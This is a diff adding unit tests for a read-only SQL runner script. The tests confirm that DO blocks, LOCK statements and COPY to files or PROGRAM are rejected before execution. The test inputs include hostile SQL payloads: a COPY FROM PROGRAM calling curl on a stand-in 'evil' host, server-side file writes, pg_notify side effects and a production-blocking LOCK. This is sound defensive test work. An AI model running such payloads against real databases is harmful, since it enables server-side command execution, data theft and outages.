@@ -500,4 +500,101 @@ describe("run-sql.cjs", () => {
       ]);
     }
   });
+
+  // Read-only mode does NOT block server-side side effects that touch nothing OUTSIDE
+  // the row data: an opaque DO body (can PERFORM pg_notify past the literal scan),
+  // production-blocking LOCKs, and COPY file/PROGRAM I/O. All must be rejected before
+  // execution (Codex round-8).
+  const rejectsBeforeExecution = async (payload: string, expectedError: string) => {
+    const client = makeFakeClient({
+      onQuery: (sql) => {
+        if (sql === payload) return Promise.reject(new Error("caller SQL should not be executed"));
+        if (sql === "BEGIN TRANSACTION READ ONLY") return { command: "BEGIN", rowCount: null, fields: [], rows: [] };
+        if (sql === "SELECT 1") return { command: "SELECT", rowCount: 1, fields: [{ name: "?column?" }], rows: [{ "?column?": 1 }] };
+        if (sql === "ROLLBACK") return { command: "ROLLBACK", rowCount: null, fields: [], rows: [] };
+        return { command: "SELECT", rowCount: 0, fields: [], rows: [] };
+      },
+    });
+    const { deps, error } = makeDeps({ argv: ["node", "scripts/run-sql.cjs", payload], client });
+
+    const code = await runSql.main(deps);
+
+    expect(code).toBe(1);
+    expect(error).toHaveBeenCalledWith(expectedError);
+    // Caller SQL is never executed: it is blocked between SELECT 1 and ROLLBACK.
+    expect(client.calls).toEqual([
+      { method: "connect" },
+      { method: "query", sql: "BEGIN TRANSACTION READ ONLY" },
+      { method: "query", sql: "SELECT 1" },
+      { method: "query", sql: "ROLLBACK" },
+      { method: "end" },
+    ]);
+  };
+
+  it("(q) rejects DO blocks (a PERFORM pg_notify body is otherwise masked by the dollar-quote scan)", async () => {
+    const DO_ERROR =
+      "SQL ERROR: DO blocks are not allowed in read-only SQL: an anonymous code body is opaque to the safety scan and can raise notifications or other side effects that read-only mode does not block.";
+    for (const payload of [
+      "DO $$BEGIN PERFORM pg_notify('crm_events', 'evt'); END$$;",
+      "do $$ begin perform pg_notify('crm_events','evt'); end $$;",
+      "DO $tag$ BEGIN PERFORM pg_notify('crm_events', 'evt'); END $tag$;",
+    ]) {
+      await rejectsBeforeExecution(payload, DO_ERROR);
+    }
+  });
+
+  it("(r) rejects LOCK statements (ACCESS EXCLUSIVE by default; can block production)", async () => {
+    const LOCK_ERROR =
+      "SQL ERROR: LOCK statements are not allowed in read-only SQL: they take an ACCESS EXCLUSIVE lock by default and can block production traffic for the life of the transaction.";
+    for (const payload of [
+      "LOCK TABLE office_dallas.deals; SELECT pg_sleep(60);",
+      "LOCK office_dallas.deals IN ACCESS EXCLUSIVE MODE;",
+    ]) {
+      await rejectsBeforeExecution(payload, LOCK_ERROR);
+    }
+  });
+
+  it("(s) rejects COPY to a file or TO/FROM PROGRAM (server-side file/command I/O)", async () => {
+    const COPY_ERROR =
+      "SQL ERROR: COPY to a file or PROGRAM is not allowed in read-only SQL: it performs server-side file/command I/O that read-only mode does not prevent. Only COPY ... TO STDOUT is permitted.";
+    for (const payload of [
+      "COPY (SELECT * FROM office_dallas.deals) TO '/tmp/x';",
+      "COPY office_dallas.deals TO PROGRAM 'gzip > /tmp/x.gz';",
+      "COPY office_dallas.deals FROM PROGRAM 'curl http://evil';",
+      "COPY office_dallas.deals FROM '/tmp/in.csv';",
+    ]) {
+      await rejectsBeforeExecution(payload, COPY_ERROR);
+    }
+  });
+
+  it("(t) allows COPY ... TO STDOUT and does NOT reject columns named do_/lock_/copy_*", async () => {
+    for (const payload of [
+      "COPY (SELECT count(*) FROM placeholder.widgets) TO STDOUT;", // pure client export
+      "SELECT do_thing FROM placeholder.widgets;", // identifier merely starting "do"
+      "SELECT lock_id FROM placeholder.widgets;", // identifier merely starting "lock"
+      "SELECT copy_count FROM placeholder.widgets;", // identifier merely starting "copy"
+    ]) {
+      const client = makeFakeClient({
+        onQuery: (sql) => {
+          if (sql === "BEGIN TRANSACTION READ ONLY") return { command: "BEGIN", rowCount: null, fields: [], rows: [] };
+          if (sql === "SELECT 1") return { command: "SELECT", rowCount: 1, fields: [{ name: "?column?" }], rows: [{ "?column?": 1 }] };
+          if (sql === payload) return { command: "SELECT", rowCount: 1, fields: [{ name: "x" }], rows: [{ x: 1 }] };
+          if (sql === "COMMIT") return { command: "COMMIT", rowCount: null, fields: [], rows: [] };
+          return Promise.reject(new Error("unexpected query"));
+        },
+      });
+      const { deps, error } = makeDeps({ argv: ["node", "scripts/run-sql.cjs", payload], client });
+
+      const code = await runSql.main(deps);
+
+      expect(code).toBe(0);
+      expect(error).not.toHaveBeenCalled();
+      expect(client.calls.filter((c) => c.method === "query").map((c) => c.sql)).toEqual([
+        "BEGIN TRANSACTION READ ONLY",
+        "SELECT 1",
+        payload,
+        "COMMIT",
+      ]);
+    }
+  });
 });
